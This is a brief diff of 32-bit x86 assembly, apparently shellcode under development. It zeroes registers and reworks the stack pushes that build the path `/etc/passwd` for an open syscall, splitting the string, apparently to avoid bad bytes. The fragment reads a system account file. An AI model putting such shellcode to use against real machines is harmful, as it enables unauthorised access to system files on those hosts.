@@ -3,13 +3,16 @@ bits 32
 global _start
 
 _start:
+  xor eax, eax
+  xor ebx, ebx
   xor ecx, ecx
-  mul ecx
+  xor edx, edx
 
 open:
   mov al, 0x05
   push ecx
-  push `swd`
+  push `d`
+  push WORD `sw`
   push `/pas`
   push `/etc`
   mov ebx, esp
